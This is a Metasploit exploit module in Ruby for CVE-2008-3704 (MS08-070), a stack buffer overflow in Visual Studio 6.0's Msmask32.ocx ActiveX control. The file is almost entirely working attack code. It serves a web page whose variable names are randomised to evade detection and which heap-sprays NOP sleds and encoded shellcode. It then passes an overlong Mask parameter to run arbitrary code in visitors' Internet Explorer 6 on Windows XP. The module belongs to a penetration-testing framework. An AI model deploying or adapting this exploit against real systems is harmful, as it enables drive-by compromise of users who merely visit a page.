##
# $Id: ms08_070_visual_studio_msmask.rb 11127 2010-11-24 19:35:38Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Microsoft Visual Studio Msmask32.ocx ActiveX Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack buffer overflow in Microsoft's Visual Studio 6.0.
				When passing a specially crafted string to the Mask parameter of the
				Msmask32.ocx ActiveX Control, an attacker may be able to execute arbitrary
				code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'koshi', 'MC' ],
			'Version'        => '$Revision: 11127 $',
			'References'     =>
				[
					[ 'CVE', '2008-3704' ],
					[ 'OSVDB', '47475' ],
					[ 'BID', '30674' ],
					[ 'MSB', 'MS08-070' ]
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars'      => "\x00",
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0-SP2 IE 6.0 SP0-SP2', { 'Ret' => '' } ]
				],
			'DisclosureDate' => 'Aug 13 2008',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URIPATH', [ true, "The URI to use.", "/" ])
			], self.class)
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload.
		return if ((p = regenerate_payload(cli)) == nil)

		# Encode the shellcode.
		shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))

		# Create some nops.
		nops    = Rex::Text.to_unescape(make_nops(4))

		# Randomize the javascript variable names.
		vname  = rand_text_alpha(rand(100) + 1)
		var_i  = rand_text_alpha(rand(30)  + 2)
		rand1  = rand_text_alpha(rand(100) + 1)
		rand2  = rand_text_alpha(rand(100) + 1)
		rand3  = rand_text_alpha(rand(100) + 1)
		rand4  = rand_text_alpha(rand(100) + 1)
		rand5  = rand_text_alpha(rand(100) + 1)
		rand6  = rand_text_alpha(rand(100) + 1)
		rand7  = rand_text_alpha(rand(100) + 1)
		rand8  = rand_text_alpha(rand(100) + 1)
		rand9  = rand_text_alpha(rand(100) + 1)
		rand10  = rand_text_alpha(rand(100) + 1)
		rand11  = rand_text_alpha(rand(100) + 1)

		content = %Q|
<html>
	<script language="javascript">
	var #{rand1}='<object classid="clsid:C932BA85-4374-101B-A56C-00AA003668DC"><param name="Mask" value="';
	var #{rand2}='"></object>';
	var #{rand3} = '';
	for (#{var_i}=1;#{var_i}<=2145;#{var_i}++){#{rand3}=#{rand3}+unescape("%0c");}
	var #{rand4} = unescape("#{shellcode}");
	var #{rand5} = (#{rand4}.length * 2);
	var #{rand6} = unescape("#{nops}");
	var #{rand7} = 0x0c0c0c0c;
	var #{rand8} = 0x100000;
	var #{rand9} = #{rand8} - (#{rand5} + 1);
	var #{rand10} = (#{rand7}+#{rand8})/#{rand8};
	var #{rand11} = new Array();
	while (#{rand6}.length*2<#{rand9})
	{ #{rand6} += #{rand6}; }
	#{rand6} = #{rand6}.substring(0,#{rand9}/2);
	for (#{var_i}=0;#{var_i}<#{rand10};#{var_i}++)
	{ #{rand11}[#{var_i}] = #{rand6} + #{rand4}; }
	document.write(#{rand1}+#{rand3}+#{rand2});
	</script>
</html>
			|

		print_status("Sending #{self.name} to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end
